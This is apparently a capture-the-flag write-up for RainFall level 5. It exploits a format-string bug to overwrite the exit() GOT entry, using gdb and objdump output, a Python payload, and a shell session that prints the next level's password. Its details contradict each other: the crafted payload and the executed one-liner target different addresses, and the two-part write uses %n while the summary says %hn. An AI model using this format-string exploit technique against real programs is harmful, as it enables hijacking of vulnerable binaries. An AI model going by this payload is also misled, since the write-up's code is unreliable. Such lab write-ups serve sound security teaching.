# Level 5 - GOT Overwrite with Format String

## Objective
Overwrite `exit()` GOT entry to redirect execution to `o()` function.

## Analysis

### Finding Target Function
```bash
(gdb) info functions
0x080484a4  o

(gdb) print o
$1 = {<text variable, no debug info>} 0x80484a4 <o>
```

### Finding GOT Entry for exit()
```bash
objdump -R level5

OFFSET   TYPE              VALUE
0804997c R_386_JUMP_SLOT   exit
```

### Testing Format String Offset
```bash
level5@RainFall:~$ python -c 'print "AAAA" + ".%x"*10' | ./level5
```

Find where "AAAA" (0x41414141) appears - let's say 4th position.

## Exploitation Strategy

We need to write `0x080484a4` to address `0x0804997c`.

### Method: Write in Two Parts
Split the address into two shorts:
- Low: 0x84a4 (33956 in decimal)
- High: 0x0804 (2052 in decimal)

Write to:
- 0x0804997c (low 2 bytes)
- 0x0804997e (high 2 bytes)

### Crafting Payload
```python
# Addresses (little-endian)
exit_got_low = "\x7c\x99\x04\x08"
exit_got_high = "\x7e\x99\x04\x08"

# Calculate padding
# We want: 33956 total for first write, 2052 for second
# But 2052 < 33956, so we write 0x10804 = 67588
# 67588 - 33956 = 33632

payload = exit_got_low + exit_got_high
payload += "%33948x"  # 33956 - 8 (two addresses)
payload += "%4$n"     # Write to 4th param
payload += "%33632x"  # 67588 - 33956
payload += "%5$n"     # Write to 5th param

print payload
```

### Execution
```bash
level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit
level5@RainFall:~$ cat /tmp/exploit - | ./level5
                                                                                                                                                                                                              512
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## Key Concepts
- GOT (Global Offset Table)
- GOT overwrite technique
- Format string arbitrary write
- Writing 32-bit values with %hn